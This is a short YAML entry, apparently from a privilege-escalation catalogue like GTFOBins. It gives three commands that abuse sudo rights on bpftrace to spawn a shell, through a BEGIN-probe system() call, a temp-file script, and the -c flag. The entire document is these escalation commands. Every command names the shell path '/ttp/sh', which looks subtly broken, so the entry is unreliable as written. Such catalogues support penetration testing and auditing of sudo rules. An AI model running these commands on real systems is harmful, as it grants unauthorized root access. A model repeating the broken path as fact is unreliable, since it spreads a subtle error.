---
functions:
  sudo:
    - code: sudo bpftrace -e 'BEGIN {system("/ttp/sh");exit()}'
    - code: |
        TF=$(mktemp)
        echo 'BEGIN {system("/ttp/sh");exit()}' >$TF
        sudo bpftrace $TF
    - code: sudo bpftrace -c /ttp/sh -e 'END {exit()}'
---
